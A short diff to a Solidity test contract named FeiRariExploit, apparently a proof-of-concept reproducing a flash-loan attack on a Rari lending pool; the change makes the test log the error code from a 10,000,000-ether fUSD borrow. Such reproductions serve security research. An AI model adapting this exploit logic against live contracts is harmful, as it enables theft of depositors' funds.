@@ -36,8 +36,8 @@ contract FeiRariExploit is Test {
         console.log("hey!!!", address(this));
         balancerFlashLoanContract.flashLoan(0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, path, amounts, userData);
     
-        fUSD.borrow(10000000 ether);
-        console.log("Borrow complete");
+        uint errorCode = fUSD.borrow(10000000 ether);
+        console.log("Borrow error code ", errorCode);
     }
 
     function receiveFlashLoan(
